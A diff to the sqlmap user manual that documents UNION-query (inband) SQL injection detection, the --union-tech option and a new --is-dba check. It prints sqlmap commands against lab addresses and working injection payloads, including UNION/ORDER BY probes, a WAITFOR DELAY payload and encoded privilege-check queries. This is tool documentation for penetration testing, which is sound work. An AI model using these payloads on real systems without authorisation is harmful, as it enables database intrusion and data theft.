@@ -144,7 +144,7 @@ sqlmap implements three techniques to exploit a SQL injection
 vulnerability:
 
 <itemize>
-<item><bf>Inferential Blind SQL injection</bf>: sqlmap appends to the
+<item><bf>Inferential blind SQL injection</bf>: sqlmap appends to the
 affected parameter in the HTTP request, a syntatically valid SQL statement
 string containing a <tt>SELECT</tt> sub-statement, or any other SQL
 statement whose the user want to retrieve the output.
@@ -1539,7 +1539,7 @@ Options: <tt>--string</tt> and <tt>--regexp</tt>
 
 <p>
 By default the distinction of a True query by a False one (basic concept
-for Inferential Blind SQL injection attacks) is done comparing injected
+for Inferential blind SQL injection attacks) is done comparing injected
 requests page content MD5 hash with the original not injected page content
 MD5 hash.
 Not always this concept works because sometimes the page content changes at
@@ -1897,8 +1897,8 @@ time based blind sql injection payload:    'name=luther'; WAITFOR DELAY '0:0:5';
 Options: <tt>--union-test</tt> and <tt>--union-tech</tt>
 
 <p>
-It is possible to test if the target URL is affected by an <bf>inband
-SQL injection</bf> vulnerability.
+It is possible to test if the target URL is affected by a <bf>UNION query
+(inband) SQL injection</bf> vulnerability.
 Refer to the <em>Techniques</em> section for details on this SQL injection
 technique.
 
@@ -1912,35 +1912,45 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" \
 [...]
 back-end DBMS:  Oracle
 
-[hh:mm:55] [INFO] testing inband sql injection on parameter 'id'
-[hh:mm:55] [INFO] the target url could be affected by an inband sql injection vulnerability
+[hh:mm:27] [INFO] testing inband sql injection on parameter 'id' with NULL bruteforcing 
+technique
+[hh:mm:27] [INFO] the target url could be affected by an inband sql injection vulnerability
 valid union:    'http://192.168.1.121:80/sqlmap/oracle/get_int.php?id=1 UNION ALL SELECT 
-NULL, NULL, NULL FROM DUAL-- AND 5601=5601'
+NULL, NULL, NULL FROM DUAL-- AND 6558=6558'
 </verb></tscreen>
+
+<p>
+By default sqlmap uses the <bf><tt>NULL</tt> bruteforcing</bf> technique to
+detect the number of columns within the original <tt>SELECT</tt> statement.
+It is also possible to change it to <bf><tt>ORDER BY</tt> clause
+bruteforcing</bf> with the <tt>--union-tech</tt> option.
+
+<p>
+Further details on these techniques can be found <htmlurl
+url="http://bernardodamele.blogspot.com/2007/07/insight-on-union-query-sql-injection.html" name="here">.
 
 <p>
 Example on a <bf>PostgreSQL 8.3.5</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1" \
-  --union-test -v 1
+  --union-test --union-tech orderby -v 1
 
 [...]
-web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
-web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: PostgreSQL
 
-[hh:mm:29] [INFO] testing inband sql injection on parameter 'id'
-[hh:mm:29] [INFO] the target url could be affected by an inband sql injection vulnerability
-valid union:    'http://192.168.1.121:80/sqlmap/pgsql/get_str.php?id=1' UNION ALL SELECT NULL, 
-NULL, NULL-- AND 'iBEMR'='iBEMR'
+[hh:mm:51] [INFO] testing inband sql injection on parameter 'id' with ORDER BY clause 
+bruteforcing technique
+[hh:mm:51] [INFO] the target url could be affected by an inband sql injection vulnerability
+valid union:    'http://192.168.1.150:80/sqlmap/pgsql/get_int.php?id=1 ORDER BY 3-- AND 
+1262=1262'
 </verb></tscreen>
 
 <p>
 As you can see, the target URL parameter <tt>id</tt> might be also
-affected by an inband SQL injection.
-In case this vulnerability is exploitable it is strongly recommended to
-use this technique which saves a lot of time.
+exploitable by the inband SQL injection technique.
+In case a case it is strongly recommended to use this technique which saves
+a lot of time.
 
 <p>
 It is strongly recommended to run at least once sqlmap with the
@@ -1981,7 +1991,8 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 
 back-end DBMS:	Microsoft SQL Server 2000
 
 [hh:mm:42] [INFO] fetching banner
-[hh:mm:42] [INFO] testing inband sql injection on parameter 'id'
+[hh:mm:42] [INFO] testing inband sql injection on parameter 'id' with NULL bruteforcing 
+technique
 [hh:mm:42] [INFO] the target url could be affected by an inband sql injection vulnerability
 [hh:mm:42] [INFO] confirming full inband sql injection on parameter 'id'
 [hh:mm:42] [INFO] the target url is affected by an exploitable full inband sql injection 
@@ -2073,7 +2084,8 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_partialunion.ph
 back-end DBMS: MySQL >= 5.0.0
 
 [hh:mm:56] [INFO] fetching database names
-[hh:mm:56] [INFO] testing inband sql injection on parameter 'id'
+[hh:mm:56] [INFO] testing inband sql injection on parameter 'id' with NULL bruteforcing 
+technique
 [hh:mm:56] [INFO] the target url could be affected by an inband sql injection vulnerability
 [hh:mm:56] [INFO] confirming full inband sql injection on parameter 'id'
 [hh:mm:56] [WARNING] the target url is not affected by an exploitable full inband sql 
@@ -2122,6 +2134,8 @@ page content.
 <sect1>Fingerprint
 
 <sect2>Extensive database management system fingerprint
+
+<!-- TODO: improve examples on basic DBMS fingerprint -->
 
 <p>
 Options: <tt>-f</tt> or <tt>--fingerprint</tt>
@@ -2532,6 +2546,52 @@ Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --current-db -v 0
 
 current database:    'master'
+</verb></tscreen>
+
+
+<sect2>Detect if the DBMS current user is a database administrator
+
+<p>
+Option: <tt>--is-dba</tt>
+
+<p>
+It is possible to detect if the  database management system session user is
+a database administrator.
+
+<p>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 1
+
+[...]
+back-end DBMS: PostgreSQL
+
+[hh:mm:52] [INFO] testing if current user is DBA
+[hh:mm:52] [INFO] query: SELECT (CASE WHEN ((SELECT usesuper=true FROM pg_user WHERE 
+usename=CURRENT_USER OFFSET 0 LIMIT 1)=CHR(116)||CHR(114)||CHR(117)||CHR(101)) THEN 1 
+ELSE 0 END)
+[hh:mm:52] [INFO] retrieved: 
+[hh:mm:52] [INFO] performed 6 queries in 0 seconds
+current user is DBA:    'False'
+</verb></tscreen>
+
+<p>
+Example on an <bf>Oracle XE 10.2.0.1</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --is-dba -v 1
+
+[...]
+back-end DBMS: Oracle
+
+[16:40:57] [INFO] testing if current user is DBA
+[16:40:58] [INFO] query: SELECT (CASE WHEN ((SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE 
+GRANTEE=SYS.LOGIN_USER AND GRANTED_ROLE=CHR(68)||CHR(66)||CHR(65))=CHR(68)||CHR(66)||CHR(65)) 
+THEN 1 ELSE 0 END) FROM DUAL
+[16:40:58] [INFO] retrieved: 1
+[16:40:58] [INFO] performed 13 queries in 0 seconds
+current user is DBA:    'True'
 </verb></tscreen>
 
 
@@ -3334,7 +3394,7 @@ as a users' database.
 
 <sect2>Run your own SQL statement
 
-<!-- TODO: improve -->
+<!-- TODO: improve with example on INSERT/DROP/xp_cmdshell -->
 
 <p>
 Options: <tt>--sql-query</tt> and <tt>--sql-shell</tt>
@@ -3390,10 +3450,11 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --sql
 
 [...]
 [hh:mm:03] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
-[hh:mm:03] [INFO] testing inband sql injection on parameter 'id'
+[hh:mm:03] [INFO] testing inband sql injection on parameter 'id' with NULL bruteforcing 
+technique
 [hh:mm:03] [INFO] the target url could be affected by an inband sql injection vulnerability
-[hh:mm:03] [INFO] confirming inband sql injection on parameter 'id'
-[hh:mm:03] [INFO] the target url is affected by an exploitable inband sql injection
+[hh:mm:03] [INFO] confirming full inband sql injection on parameter 'id'
+[hh:mm:03] [INFO] the target url is affected by an exploitable full inband sql injection
 vulnerability
 [hh:mm:03] [INFO] query:  UNION ALL SELECT NULL, (CHAR(77)+CHAR(68)+CHAR(75)+CHAR(104)+
 CHAR(70)+CHAR(67))+ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)), (CHAR(32)))
